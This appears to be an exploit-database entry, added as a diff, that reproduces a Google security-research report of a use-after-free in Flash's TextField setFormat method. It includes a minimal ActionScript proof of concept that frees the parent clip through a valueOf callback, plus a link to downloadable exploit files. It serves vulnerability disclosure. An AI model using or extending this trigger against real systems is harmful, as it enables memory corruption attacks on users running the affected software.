@@ -1,0 +1,34 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=586
+
+The TextField setFormat method contains a use-after-free. If an integer parameter has valueOf defined, or the object parameter overrides a constructor, this method can free the TextField parent, which is subsequently used.
+
+A minimal PoC is as follows:
+
+var times = 0;
+var mc = this.createEmptyMovieClip("mc", 101);
+var tf = mc.createTextField("tf", 102, 1, 1, 100, 100);
+var f = new TextFormat();
+tf.setFormat( {valueOf : func}, 2, f);
+
+function func(){
+
+        if(times == 0){
+             times++;
+             return 0;
+
+         }
+
+	mc.removeMovieClip();
+
+        // Fix heap here
+
+	return 0;
+	
+	}
+
+A sample swf and fla are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39046.zip
+
